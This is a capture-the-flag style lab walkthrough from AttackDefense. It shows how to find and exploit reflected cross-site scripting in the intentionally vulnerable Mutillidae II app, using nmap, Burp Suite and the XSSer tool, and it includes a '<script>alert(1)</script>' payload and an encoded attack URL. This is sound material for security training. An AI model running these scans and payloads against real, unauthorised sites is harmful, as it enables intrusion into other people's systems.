r![](Aspose.Words.f3f0bea0-777c-43a0-83c2-41c2aacbefd2.001.png)

![ref1]
<table><tr><th colspan="1"><b>Name</b> </th><th colspan="1">XSS Attack with XSSer </th></tr>
<tr><td colspan="1" rowspan="2"><b>URL</b> </td><td colspan="1" valign="bottom"><https://attackdefense.com/challengedetails?cid=1889> </td></tr>
<tr><td colspan="1"></td></tr>
<tr><td colspan="1"><b>Type</b> </td><td colspan="1">Webapp Pentesting Basics </td></tr>
</table>

**Important Note:** This document illustrates all the important steps required to complete this lab. This  is  by  no  means  a  comprehensive  step-by-step  solution for this exercise. This is only provided as a reference to various commands needed to complete this exercise and for your further research on this topic. Also, note that the IP addresses and domain names might be different in your lab.  

**Step 1:** Start the terminal and check the IP address of the machine. **Command:** ip addr 

![](Aspose.Words.f3f0bea0-777c-43a0-83c2-41c2aacbefd2.003.jpeg)

The IP address of the attacker machine is 192.94.37.2, the target machine will be located at IP address 192.94.37.3 

**Step 2:** Run a Nmap scan against the target IP. **Command:** nmap -sS -sV 192.94.37.3 

![](Aspose.Words.f3f0bea0-777c-43a0-83c2-41c2aacbefd2.004.png)

Port 80 and 3306 are open.**  

**Step 3:** Access the web application using firefox.  **Command:** firefox http://192.94.37.3 

![](Aspose.Words.f3f0bea0-777c-43a0-83c2-41c2aacbefd2.005.jpeg)

**Step 4:** Navigate to the XSS DNS lookup webpage. **URL:** http://192.94.37.3/index.php?page=dns-lookup.php 

![](Aspose.Words.f3f0bea0-777c-43a0-83c2-41c2aacbefd2.006.jpeg)

**Step 5:** Enter  any text to “**Hostname/IP**” textfield and click on "Lookup DNS"  

![](Aspose.Words.f3f0bea0-777c-43a0-83c2-41c2aacbefd2.007.png)

The entered value is reflected back on the web page.  **Step 6:** Check the usage of xsser.  

**Command:** xsser --help 

![](Aspose.Words.f3f0bea0-777c-43a0-83c2-41c2aacbefd2.008.jpeg)

**Step 7:** Configure firefox to use burp suite proxy. 

![](Aspose.Words.f3f0bea0-777c-43a0-83c2-41c2aacbefd2.009.png)

**Step 8:** Start burp suite. ![](Aspose.Words.f3f0bea0-777c-43a0-83c2-41c2aacbefd2.010.jpeg)

**Step 9:**  Enter  any text to “**Hostname/IP**” textfield and click on "Lookup DNS". The request will be intercepted by burp suite. 

![](Aspose.Words.f3f0bea0-777c-43a0-83c2-41c2aacbefd2.011.jpeg)

**Step 10:** Pass the URL to XSSER. Replace “**HelloWorld**” with “**XSS”**, this is done so that XSSer will substitute payload in place of "XSS" string. 

**Command:** xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p 'target\_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' 

![](Aspose.Words.f3f0bea0-777c-43a0-83c2-41c2aacbefd2.012.jpeg)

The output confirms that the target is vulnerable.  

**Step 11:** Trying various XSS payloads by using XSSer's  “--auto” option. 

**Command:** xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p 'target\_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto 

![](Aspose.Words.f3f0bea0-777c-43a0-83c2-41c2aacbefd2.013.jpeg)

**Step 12:** Using custom XSS payload. 

**Command:** xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p 'target\_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>" 

![ref2]

![](Aspose.Words.f3f0bea0-777c-43a0-83c2-41c2aacbefd2.015.png)

The encoded XSS payload is generated.  

**Step 13:** In Burp Suite, replace the POST parameters with the final attack payload and forward the request. 

![](Aspose.Words.f3f0bea0-777c-43a0-83c2-41c2aacbefd2.016.jpeg)

The XSS payload will be triggered. 

![ref2]
![ref1]

![](Aspose.Words.f3f0bea0-777c-43a0-83c2-41c2aacbefd2.017.jpeg)

. 

**Step 14:** Performing XSS attack over GET request. Navigate to the **Poll Question** webpage. 

**URL:** http://192.94.37.3/index.php?page=user-poll.php 

![](Aspose.Words.f3f0bea0-777c-43a0-83c2-41c2aacbefd2.018.jpeg)

**Step 15:** Enter any value and submit the vote. 

![ref2]

![](Aspose.Words.f3f0bea0-777c-43a0-83c2-41c2aacbefd2.019.png)

The value nmap is reflected on the web page 

**Step 16:** Copy the URL, replace the nmap value with "XSS" and pass it to XSSer 

**URL:** http://192.94.37.3/index.php?page=user-poll.php&csrf-token=&choice=**nmap**&initials=jd&user-p oll-php-submit-button=Submit+Vote 

**Command:** xsser --url “http://192.94.37.3/index.php?page=user-poll.php&csrf-token=&choice=**XSS**&initials=jd&user-po ll-php-submit-button=Submit+Vote” 

![](Aspose.Words.f3f0bea0-777c-43a0-83c2-41c2aacbefd2.020.jpeg)

![ref2]
![ref1]

**Step 17:** Providing basic XSS payload to XSSer 

**Command:** xsser --url "http://192.94.37.3/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=jd&user-po ll-php-submit-button=Submit+Vote" --Fp "<script>alert(1)</script>" 

![](Aspose.Words.f3f0bea0-777c-43a0-83c2-41c2aacbefd2.021.jpeg)

**Step 18:** Open the final attack link to trigger the XSS vulnerability in firefox browser. 

**URL:** http://192.94.37.3/index.php?page=user-poll.php&csrf-token=&choice=%3Cscript%3Ealert%281 %29%3C%2Fscript%3E&initials=jd&user-poll-php-submit-button=Submit+Vote 

![](Aspose.Words.f3f0bea0-777c-43a0-83c2-41c2aacbefd2.022.jpeg)

**References** 

1. Burp Suite (<https://portswigger.net/burp>) 
1. Mutillidae II (<https://sourceforge.net/projects/mutillidae/>) 
1. XSSer Tool (<https://github.com/epsylon/xsser>) 
![ref2]

[ref1]: Aspose.Words.f3f0bea0-777c-43a0-83c2-41c2aacbefd2.002.png
[ref2]: Aspose.Words.f3f0bea0-777c-43a0-83c2-41c2aacbefd2.014.png
